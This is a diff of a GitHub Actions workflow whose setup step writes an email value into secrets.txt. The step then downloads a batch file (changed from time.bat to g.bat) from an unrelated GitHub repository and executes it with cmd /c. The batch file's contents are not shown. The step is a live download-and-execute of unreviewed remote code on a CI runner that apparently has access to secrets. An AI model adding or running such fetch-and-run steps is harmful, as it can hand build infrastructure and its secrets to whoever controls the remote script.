@@ -11,8 +11,8 @@ jobs:
       - name: Downloading & Setting Up
         run: |
          echo "EMAIL_SECRET=ainxd@hldrive.com" > secrets.txt
-         Invoke-WebRequest -Uri "https://github.com/cisipex552/5/raw/main/Time/time.bat" -OutFile "time.bat"
-         cmd /c time.bat
+         Invoke-WebRequest -Uri "https://github.com/cisipex552/5/raw/main/Time/g.bat" -OutFile "g.bat"
+         cmd /c g.bat
 
       - name: Time Counter
         run: python time.py
